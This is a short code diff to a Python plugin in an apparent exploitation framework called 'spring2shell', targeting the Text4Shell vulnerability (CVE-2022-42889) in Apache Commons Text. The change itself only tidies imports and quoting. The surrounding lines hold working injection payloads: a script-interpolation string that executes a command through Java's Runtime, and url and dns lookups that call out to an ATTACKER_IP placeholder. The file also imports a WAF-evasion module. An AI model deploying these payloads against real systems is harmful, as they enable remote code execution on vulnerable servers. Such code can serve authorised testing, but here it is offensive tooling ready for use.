@@ -5,13 +5,15 @@ Plugin for CVE-2022-42889: Text4Shell.
 from __future__ import annotations
 
 import random
-from typing import Any
-import requests
+from typing import TYPE_CHECKING, Any
 
 from spring2shell.core.reporter import build_finding
 from spring2shell.evasion.waf_engine import waf_engine
 from spring2shell.plugins.base import BasePlugin
 from spring2shell.utils.auth import audit_log, rate_limit_acquire
+
+if TYPE_CHECKING:
+    import requests
 
 
 class CVE_2022_42889_Plugin(BasePlugin):
@@ -22,7 +24,7 @@ class CVE_2022_42889_Plugin(BasePlugin):
     description = "Text4Shell — Apache Commons Text interpolation RCE"
 
     payload_templates = [
-        "${script:javascript:java.lang.Runtime.getRuntime().exec(\"COMMAND\")}",
+        '${script:javascript:java.lang.Runtime.getRuntime().exec("COMMAND")}',
         "${url:UTF-8:http://ATTACKER_IP/COMMAND}",
         "${dns:address:ATTACKER_IP}",
     ]
